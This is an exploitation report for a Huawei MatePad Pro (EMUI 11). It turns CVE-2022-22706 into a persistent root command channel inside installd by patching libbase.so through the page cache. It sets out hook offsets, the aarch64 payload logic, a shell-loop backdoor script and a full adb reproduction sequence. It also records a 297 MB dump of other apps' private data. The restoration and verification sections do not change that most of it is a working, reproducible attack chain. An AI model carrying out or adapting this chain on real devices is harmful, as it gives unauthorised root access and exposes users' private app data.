# Persistent root command channel as `u:r:installd:s0` on Huawei MatePad Pro MRX-AL09

Device: MRX-AL09, EMUI 11 / Android 10, kernel 4.14.116, SELinux enforcing, no root,
attacker = ADB `shell` (uid 2000, `u:r:shell:s0`, CapEff=0). Exploit primitive used:
**CVE-2022-22706** (Mali r18p0 page-cache write) via `pcwrite2`.

**Result: a live persistent root command channel running as `uid=0(root)`,
`context=u:r:installd:s0`, with `/data/data/<pkg>` read access. All page-cache patches
were restored and verified byte-identical. No kernel exploit, no reboot during the
final chain.**

```
$ ./channel.sh 'id; getenforce; cat /proc/self/attr/current'
uid=0(root) gid=0(root) groups=0(root) context=u:r:installd:s0
Enforcing
u:r:installd:s0
[exit 0]
```

---

## 1. Two premises that turned out to be false (measured, not inferred)

1. **`crash_dump64` is NOT root for a shell crash.** Hooking
   `libunwindstack.so` @0x4e318 in `crash_dump64` and calling `getuid()`/`geteuid()`
   logged `uid=7d0` / `euid=7d0` = **2000**. `crash_dump64` is `rwxr-xr-x root shell`
   (not setuid) and is forked from the crashing shell, so it inherits uid 2000 and
   CapEff=0. SELinux *does* allow `crash_dump -> base_typeattr_592` ptrace (installd is
   not excluded), but `PTRACE_ATTACH` on root `installd` returns `-1` (EPERM) on the
   DAC/capability check (`ptrace_access_check`: uid mismatch, no CAP_SYS_PTRACE).
   ⇒ the **crash_dump→ptrace→installd route is impossible.**

2. **Do not patch `/apex/.../libc.so` (or any non-erofs file) with this primitive.**
   `/apex/com.android.runtime` is loop-mounted **ext4**, and dirtying its page cache
   makes ext4 writeback hit `BUG()` in `mpage_prepare_extent_to_map`, which panics the
   kernel (`CONFIG_PANIC_ON_OOPS=y`), boot reason `kernel_panic,bug`. Two such panics
   occurred (one ~30 s after patching libc `fork`, one ~2 s after, both in
   `wb_workfn → ext4_writepages`). `/system` is **erofs (read-only, no writepages)** and
   is the only safe target. The reboots cleared the libc patch; libc is pristine.

`liblogwrap.so!android_fork_execvp_ext` is not usable either: AOSP-10
`copy_directory_recursive()` is its only caller in installd (snapshot/restore), not the
dexopt path.

## 2. Working chain — cold-function hook in `/system/lib64/libbase.so`

`installd` (root, `u:r:installd:s0`) is the only running userspace domain with
`open`+`read` on `app_data_file`, and it has full `shell_data_file` (`/data/local/tmp`)
access. Trigger: `cmd package compile -m speed -f <pkg>` makes installd run its dexopt
path, which unconditionally calls `android::base::GetBoolProperty()`.

* **Target T** = `_ZN7android4base15GetBoolPropertyE...` @ file/vaddr **0xe6f4**
  (`sub sp,sp,#0x70`; `.text` vaddr == file offset).
* **Hook** = 4-byte `b 0x10418` written at 0xe6f4.
* **Payload host H** = `_ZN13CapturedStdFd5ResetEv` @ **0x10418** (928 B; a test-only
  libbase class, effectively never called in production), overwritten with a 207-byte
  position-independent payload.

Payload logic (aarch64, `-nostdlib -fPIC`, all scratch in registers/no writable data):

```
sub sp,sp,#0x60; save x0..x8
getpid()                      (syscall 172)
if pid != installd_pid -> restore x0..x8; replay T's 1st insn; b T+4   (trampoline)
else clone(SIGCHLD,0,0,0,0)   (syscall 220)
     child: execve("/system/bin/sh", ["sh","/data/local/tmp/r.sh"], NULL)  (syscall 221)
     parent: restore x0..x8; replay T's 1st insn; b T+4
```

Because every path replays `GetBoolProperty`'s original first instruction and returns to
T+4, the hook is transparent to every other caller. The child keeps uid 0 and stays
`u:r:installd:s0` (`installd -> shell_exec:file execute_no_trans`, no type transition).

`/data/local/tmp/r.sh` is the persistent loop:

```sh
D=/data/local/tmp
c=$(cat /proc/self/attr/current); u=$(id -u)
echo "channel pid=$$ uid=$u ctx=$c" >> "$D/hits"
: > "$D/ready"
while true; do
  if [ -f "$D/cmd" ]; then
    cp "$D/cmd" "$D/cmd.run"; rm -f "$D/cmd"
    : > "$D/out"
    /system/bin/sh "$D/cmd.run" > "$D/out" 2>&1
    echo "[exit $?]" >> "$D/out"
  fi
  sleep 1
done
```

## 3. Exact host + device command sequence (reproduction)

```bash
D=U4G6R20811000860
LIB=/system/lib64/libbase.so

# 0. trigger target script exists (already on device): /data/local/tmp/r.sh (loop above)

# 1. pull a pristine copy of libbase and get installd pid
adb -s $D pull $LIB /tmp/libbase.so
PID=$(adb -s $D shell pidof installd | tr -d '\r')

# 2. build 207-byte payload (hosted at 0x10418) + 4-byte branch (at 0xe6f4 -> 0x10418)
./build_libhook.sh /tmp/libbase.so 0xe6f4 0x10418 0xe6f8 "$PID"
#   -> hook_payload.bin, hook_branch.bin

# 3. save original bytes BEFORE patching (erofs; page cache only)
adb -s $D shell "dd if=$LIB of=/data/local/tmp/lb_T_orig.bin bs=1 skip=\$((0xe6f4))  count=4"
adb -s $D shell "dd if=$LIB of=/data/local/tmp/lb_H_orig.bin bs=1 skip=\$((0x10418)) count=1024"

# 4. push and patch (host region first, then the target entry)
adb -s $D push hook_payload.bin /data/local/tmp/hook_payload.bin
adb -s $D push hook_branch.bin  /data/local/tmp/hook_branch.bin
adb -s $D shell "/data/local/tmp/pcwrite2 $LIB 0x10418 /data/local/tmp/hook_payload.bin"
adb -s $D shell "/data/local/tmp/pcwrite2 $LIB 0xe6f4  /data/local/tmp/hook_branch.bin"

# 5. trigger installd dexopt -> hook fires -> root shell loops
adb -s $D shell 'cmd package compile -m speed -f com.neutronized.supercattales2'
adb -s $D shell 'ps -A -o PID,PPID,USER,LABEL,NAME | grep u:r:installd:s0'
#   7447 1075 root u:r:installd:s0 sh      <- the channel

# 6. drive it
./channel.sh 'id; getenforce; cat /proc/self/attr/current'

# 7. RESTORE and verify
adb -s $D shell "/data/local/tmp/pcwrite2 $LIB 0xe6f4  /data/local/tmp/lb_T_orig.bin"
adb -s $D shell "/data/local/tmp/pcwrite2 $LIB 0x10418 /data/local/tmp/lb_H_orig.bin"
adb -s $D pull $LIB /tmp/libbase_after.so && cmp /tmp/libbase_after.so /tmp/libbase.so
```

## 4. Evidence

Root channel identity:

```
uid=0(root) gid=0(root) groups=0(root) context=u:r:installd:s0
Enforcing
u:r:installd:s0
/proc/self/exe -> /system/bin/toybox
```

Channel start record `/data/local/tmp/hits` (written by root, `u:r:installd:s0`):

```
channel pid=7447 uid=0 ctx=u:r:installd:s0
channel pid=7449 uid=0 ctx=u:r:installd:s0
channel pid=7448 uid=0 ctx=u:r:installd:s0
```

App-data read through the channel (installd is the only root domain allowed to do this):

```
$ ./channel.sh 'ls -la /data/data/com.neutronized.supercattales2'
drwx------ 9 u0_a213 u0_a213 ... /data/data/com.neutronized.supercattales2
```

End-to-end extraction of the original objective (all `/data/local/tmp/pkgs`, via the
channel running as root in installd domain) → `/data/local/tmp/dump/` (**297 MB**):

| package | size |
|---|---|
| business.braid.polycule | 271M |
| com.FDGEntertainment.SuperCatBros.gp | 17M |
| com.hg.ninjaherocatsfree | 6.9M |
| com.tgc.sky.android | 638K |
| com.thegamebakers.combocrew | 361K |
| com.juicybeast.knightmaretower | 340K |
| com.neutronized.supercattales2 | 239K |
| io.phonk.extended | 26K |
| com.karin.idTech4Amm | 22K |
| org.eukaryot.sonic3air | 18K |
| com.aige.hipaint | (no data dir) |

Header checks:

```
com.neutronized.supercattales2/databases/google_app_measurement_local.db
  16384 B -> "SQLite format 3"          (real SQLite)
com.neutronized.supercattales2/shared_prefs/...prefs.xml  920 B  -> "<?xml version='1"
com.juicybeast.knightmaretower/shared_prefs/...xml       9043 B  -> "<?xml version='1"
com.thegamebakers.combocrew/shared_prefs/...xml         36089 B  -> "<?xml version='1"
com.hg.ninjaherocatsfree/shared_prefs/options.xml         147 B  -> "<?xml version='1"
business.braid.polycule/files/polycule_client_1.sqlite 71294976 B -> encrypted (SQLCipher), not plain SQLite
```

## 5. Cleanup / restoration (verified)

| library | state |
|---|---|
| `/system/lib64/libbase.so` | patched, **restored**, md5 == pristine host copy |
| `/system/lib64/libunwindstack.so` | patched during recon, **restored**, md5 == pristine |
| `/system/lib64/liblogwrap.so` | never patched, md5 == pristine |
| `/apex/.../bionic/libc.so` | patched once (panicked), cleared by reboot, md5 == pristine |

Original bytes at both libbase hook sites are back (`0xe6f4` = `sub sp,sp,#0x70`,
`0x10418` = original `CapturedStdFd::Reset` prologue). The running channel is already
exec'd, so it is unaffected by the restore.

## 6. Caveats

* The channel dies on reboot (the hook is not persisted).
* I-cache staleness is why a **cold** function was required: a hook in a function
  installd had already executed (e.g. `RefBase::decStrong`) does not take effect.
  `GetBoolProperty` happened to be cold after boot; 3 channel loops spawned on the first
  dexopt and no more on subsequent dexopts. Two spare loops were killed, leaving one.
* Duplicate-execution risk: the loop is single-instance now; run mutating commands once.
* If installd is restarted, the channel keeps running (reparented to init) but new
  commands stop being serviced; re-run the hook to get a fresh channel.
* `loadavg` reads ~46 on this device while CPU is ~86% idle (I/O accounting quirk);
  it is not an overload.

## 7. Artifacts

```
exploits/CVE-2022-22706-poc/crashdump_ptrace/
  payload_libhook.S     generic cold-hook payload (aarch64 asm, PID/insn templated)
  build_libhook.sh      builds hook_payload.bin + hook_branch.bin
  channel.sh            host-side channel driver (./channel.sh '<cmds>')
  payload_fork.S        (abandoned: libc fork hook - libc is ext4, unsafe)
  payload_ptrace.S      (abandoned: crash_dump ptrace - crash_dump is uid 2000)
  payload_logwrap.S     (abandoned: liblogwrap is not on the dexopt path)
```
